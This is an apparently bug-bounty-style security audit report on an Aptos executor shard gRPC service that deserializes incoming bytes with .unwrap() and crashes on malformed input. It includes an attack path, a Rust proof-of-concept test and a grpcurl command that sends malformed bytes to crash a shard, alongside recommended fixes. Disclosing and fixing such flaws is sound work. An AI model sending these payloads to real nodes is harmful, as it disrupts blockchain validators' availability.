# Audit Report

## Title
Unvalidated NetworkMessage Deserialization Causes Executor Shard Crash via Panic

## Summary
The `NetworkMessageService` trait does not enforce validation of incoming `NetworkMessage` requests, and its implementation blindly forwards raw bytes to handlers that deserialize with `.unwrap()`, causing unrecoverable panics when malformed data is received. This allows unprivileged attackers to crash executor shard threads by sending malformed BCS-encoded messages to exposed gRPC endpoints.

## Finding Description

The `NetworkMessageService` trait defines a single method signature without any validation requirements: [1](#0-0) 

The implementation `GRPCNetworkMessageServiceServerWrapper` receives `NetworkMessage` objects containing arbitrary bytes and a message type string, but performs **zero validation** before forwarding to registered handlers: [2](#0-1) 

The `NetworkMessage` protobuf structure contains raw bytes with no schema enforcement: [3](#0-2) 

These unvalidated bytes are forwarded to the executor shard's command handler, which attempts BCS deserialization **with `.unwrap()` and no error handling**: [4](#0-3) 

This deserialization occurs inside the main execution loop of the shard service, which has **no panic recovery mechanism**: [5](#0-4) 

**Attack Path:**
1. Attacker identifies executor shard gRPC endpoints (listening on configured addresses)
2. Attacker crafts malformed bytes that fail BCS deserialization (e.g., invalid enum discriminant, truncated data, type mismatches)
3. Attacker sends NetworkMessage with `message_type = "execute_command_{shard_id}"` and malformed `message` bytes
4. gRPC server accepts and forwards message without validation
5. Handler attempts `bcs::from_bytes(&message.data).unwrap()` on malformed data
6. `.unwrap()` panics on deserialization error
7. Executor shard thread crashes and exits the loop
8. Shard becomes permanently unavailable until manual restart

This breaks the **availability invariant** - executor shards must remain operational to process blocks in the sharded execution model.

## Impact Explanation

**HIGH Severity** per Aptos Bug Bounty criteria:

This vulnerability causes **validator node slowdowns** and **significant protocol violations** by crashing executor shard threads. The impact includes:

- **Execution Disruption**: Crashed shards cannot process their assigned transactions, blocking sharded block execution
- **Availability Loss**: The panic is unrecoverable; manual node restart is required
- **No Authentication**: gRPC endpoints have no authentication/authorization (confirmed via code analysis)
- **Trivial Exploitation**: Attacker only needs to send malformed bytes - no complex exploit required
- **Cascade Potential**: Attacker can target multiple shards sequentially to completely disable sharded execution

While this doesn't directly cause consensus safety violations or fund loss, it severely degrades the execution layer's availability, which is critical infrastructure for block processing.

## Likelihood Explanation

**HIGH Likelihood:**

- **Low Barrier to Entry**: No authentication required on gRPC endpoints
- **Simple Attack Vector**: Send any malformed BCS data (random bytes, truncated messages, wrong types)
- **Guaranteed Panic**: The `.unwrap()` pattern guarantees a crash on invalid input
- **No Defense-in-Depth**: No validation at any layer (gRPC → handler → deserialize)
- **Network Exposed**: Executor services bind to network addresses for inter-shard communication

The only limiting factor is whether executor shard endpoints are network-accessible, but the architecture requires this for distributed execution.

## Recommendation

Implement defense-in-depth validation at multiple layers:

**1. Handler-Level Error Handling** (Immediate Fix):
Replace `.unwrap()` with proper error handling in command reception:

```rust
// In remote_cordinator_client.rs, line 89:
let request: RemoteExecutionRequest = match bcs::from_bytes(&message.data) {
    Ok(req) => req,
    Err(e) => {
        error!("Failed to deserialize RemoteExecutionRequest: {:?}", e);
        return ExecutorShardCommand::Stop; // Or continue loop without crashing
    }
};
```

**2. Trait-Level Validation Contract**:
Modify `NetworkMessageService` to enforce validation (breaking change):

```rust
#[async_trait]
pub trait NetworkMessageService: Send + Sync + 'static {
    async fn simple_msg_exchange(
        &self,
        request: tonic::Request<super::NetworkMessage>,
    ) -> std::result::Result<tonic::Response<super::Empty>, tonic::Status> {
        // Validate message before processing
        let msg = request.into_inner();
        if msg.message.is_empty() || msg.message_type.is_empty() {
            return Err(tonic::Status::invalid_argument("Invalid message"));
        }
        self.process_validated_message(msg).await
    }
    
    async fn process_validated_message(
        &self,
        message: super::NetworkMessage,
    ) -> std::result::Result<tonic::Response<super::Empty>, tonic::Status>;
}
```

**3. Add Authentication/Authorization**:
Use gRPC interceptors to authenticate requests:

```rust
// Add to GRPCNetworkMessageServiceServerWrapper::start_async
Server::builder()
    .timeout(std::time::Duration::from_millis(rpc_timeout_ms))
    .add_service(
        NetworkMessageServiceServer::new(self)
            .max_decoding_message_size(MAX_MESSAGE_SIZE)
            .with_interceptor(auth_interceptor) // Add authentication
    )
```

**4. Message Size Limits**:
While `MAX_MESSAGE_SIZE` exists, add per-field validation for the message bytes.

## Proof of Concept

```rust
// Rust test demonstrating the vulnerability
#[test]
fn test_malformed_message_causes_panic() {
    use aptos_secure_net::network_controller::{Message, NetworkController};
    use std::net::{IpAddr, Ipv4Addr, SocketAddr};
    use aptos_protos::remote_executor::v1::{NetworkMessage, network_message_service_client::NetworkMessageServiceClient};
    use tonic::Request;
    
    // Setup executor shard on port 52201
    let shard_addr = SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), 52201);
    let coordinator_addr = SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), 52200);
    
    // Start executor service (would normally be done in production)
    let mut executor_service = ExecutorService::new(
        0, // shard_id
        1, // num_shards
        1, // num_threads
        shard_addr,
        coordinator_addr,
        vec![]
    );
    executor_service.start();
    
    // Give server time to start
    std::thread::sleep(std::time::Duration::from_millis(100));
    
    // Craft malformed BCS data that will fail deserialization
    // Example: Invalid enum discriminant for RemoteExecutionRequest
    let malformed_bytes = vec![0xFF, 0xFF, 0xFF, 0xFF]; // Invalid discriminant
    
    // Create gRPC client
    let rt = tokio::runtime::Runtime::new().unwrap();
    rt.block_on(async {
        let mut client = NetworkMessageServiceClient::connect(
            format!("http://{}", shard_addr)
        ).await.unwrap();
        
        // Send malformed message
        let request = Request::new(NetworkMessage {
            message: malformed_bytes,
            message_type: "execute_command_0".to_string(),
        });
        
        // This will be accepted by the server, but will cause a panic
        // in the executor shard thread when it tries to deserialize
        let response = client.simple_msg_exchange(request).await;
        
        // Server returns OK, but shard thread has crashed
        assert!(response.is_ok());
    });
    
    // Give time for the panic to propagate
    std::thread::sleep(std::time::Duration::from_millis(100));
    
    // Try to send a valid message - it will fail because shard is dead
    // (Additional verification logic here)
    
    executor_service.shutdown();
}
```

**Simplified exploitation steps:**
```bash
# Send malformed data to executor shard gRPC endpoint
grpcurl -plaintext -d '{"message":"////", "message_type":"execute_command_0"}' \
  localhost:52201 \
  aptos.remote_executor.v1.NetworkMessageService/SimpleMsgExchange

# The shard thread will panic and crash, requiring manual restart
```

## Notes

- The vulnerability exists in production code used for sharded block execution
- No authentication or TLS is implemented on these gRPC endpoints
- The trait is auto-generated from protobuf, but implementations must add validation
- Similar issues may exist in other message handlers (e.g., `RemoteStateViewService`)
- The `.unwrap()` pattern is a common source of panics in Rust when dealing with untrusted input

### Citations

**File:** protos/rust/src/pb/aptos.remote_executor.v1.tonic.rs (L127-133)
```rust
    pub trait NetworkMessageService: Send + Sync + 'static {
        ///
        async fn simple_msg_exchange(
            &self,
            request: tonic::Request<super::NetworkMessage>,
        ) -> std::result::Result<tonic::Response<super::Empty>, tonic::Status>;
    }
```

**File:** secure/net/src/grpc_network_service/mod.rs (L93-115)
```rust
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
```

**File:** protos/rust/src/pb/aptos.remote_executor.v1.rs (L8-13)
```rust
pub struct NetworkMessage {
    #[prost(bytes="vec", tag="1")]
    pub message: ::prost::alloc::vec::Vec<u8>,
    #[prost(string, tag="2")]
    pub message_type: ::prost::alloc::string::String,
}
```

**File:** execution/executor-service/src/remote_cordinator_client.rs (L80-90)
```rust
    fn receive_execute_command(&self) -> ExecutorShardCommand<RemoteStateViewClient> {
        match self.command_rx.recv() {
            Ok(message) => {
                let _rx_timer = REMOTE_EXECUTOR_TIMER
                    .with_label_values(&[&self.shard_id.to_string(), "cmd_rx"])
                    .start_timer();
                let bcs_deser_timer = REMOTE_EXECUTOR_TIMER
                    .with_label_values(&[&self.shard_id.to_string(), "cmd_rx_bcs_deser"])
                    .start_timer();
                let request: RemoteExecutionRequest = bcs::from_bytes(&message.data).unwrap();
                drop(bcs_deser_timer);
```

**File:** aptos-move/aptos-vm/src/sharded_block_executor/sharded_executor_service.rs (L215-224)
```rust
    pub fn start(&self) {
        trace!(
            "Shard starting, shard_id={}, num_shards={}.",
            self.shard_id,
            self.num_shards
        );
        let mut num_txns = 0;
        loop {
            let command = self.coordinator_client.receive_execute_command();
            match command {
```
